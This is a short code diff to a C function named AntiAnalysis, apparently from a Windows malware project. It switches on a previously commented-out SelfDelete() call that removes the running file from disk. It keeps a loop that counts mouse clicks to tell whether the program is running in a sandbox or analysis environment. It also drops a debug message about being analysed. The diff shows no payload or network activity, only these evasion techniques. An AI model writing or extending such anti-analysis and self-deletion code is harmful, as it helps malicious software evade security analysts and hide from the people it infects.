@@ -198,9 +198,9 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 	DWORD			i = 0;
 
 	// Self-Delete the file on disk
-	//if (!SelfDelete()) {
-
-	//}
+	if (!SelfDelete()) {
+		// Do something
+	}
 
 	while (++i <= 10) {
 		printf("[#] Monitoring Mouse-Clicks For %d Seconds - Need %d Clicks To Pass\n", (dwMilliSeconds / 1000), REQUIRED_CLICKS);
@@ -260,13 +260,8 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 		// If the user clicked more than REQUIRED_CLICKS times, we return true
 		if (g_dwMouseClicks > REQUIRED_CLICKS)
 			return TRUE;
+		// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
 		else {
-			printf("[i] Number Of Clicks: %d. %s Analyzed!!! \n",
-				g_dwMouseClicks,
-				g_dwMouseClicks < REQUIRED_CLICKS ? "Is Being" : "Not Is Being"
-			);
-
-			// If not, we reset the mouse-clicks variable, and monitor the mouse-clicks again
 			g_dwMouseClicks = 0;
 		}
 	}
